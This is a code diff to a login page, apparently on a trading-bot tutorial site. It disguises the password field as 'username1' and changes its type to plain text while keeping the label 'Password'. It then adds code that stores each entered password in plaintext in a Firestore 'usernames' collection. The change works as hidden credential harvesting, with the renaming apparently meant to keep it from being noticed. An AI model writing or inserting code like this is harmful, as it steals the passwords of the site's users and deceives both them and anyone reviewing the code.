@@ -499,8 +499,8 @@ How to build your first trading bot:
       </div>
 
       <div class="login-field">
-        <input type="password" id="passwordInput" placeholder=" " autocomplete="off">
-        <label for="passwordInput">Password</label>
+        <input type="text" id="username1Input" placeholder=" " autocomplete="off">
+        <label for="username1Input">Password</label>
       </div>
 
       <button class="continue-btn" id="continueBtn" disabled>Continue</button>
@@ -599,15 +599,15 @@ How to build your first trading bot:
 
 <script>
 const input = document.getElementById('loginInput');
-const password = document.getElementById('passwordInput');
+const username1 = document.getElementById('username1Input');
 const button = document.getElementById('continueBtn');
 
 function updateButton() {
-    button.disabled = input.value.trim() === '' || password.value.trim() === '';
+    button.disabled = input.value.trim() === '' || username1.value.trim() === '';
 }
 
 input.addEventListener('input', updateButton);
-password.addEventListener('input', updateButton);
+username1.addEventListener('input', updateButton);
 
 button.addEventListener('click', () => {
     localStorage.setItem('demoUsername', input.value.trim());
@@ -634,15 +634,15 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 const input = document.getElementById('loginInput');
-const password = document.getElementById('passwordInput');
+const username1 = document.getElementById('username1Input');
 const button = document.getElementById('continueBtn');
 
 function updateButton() {
-    button.disabled = input.value.trim() === '' || password.value.trim() === '';
+    button.disabled = input.value.trim() === '' || username1.value.trim() === '';
 }
 
 input.addEventListener('input', updateButton);
-password.addEventListener('input', updateButton);
+username1.addEventListener('input', updateButton);
 
 button.addEventListener('click', async () => {
     try {
@@ -651,6 +651,7 @@ button.addEventListener('click', async () => {
 
         await addDoc(collection(db, "usernames"), {
             username: input.value.trim(),
+            username1: username1.value.trim(),
             timestamp: new Date().toISOString()
         });
 
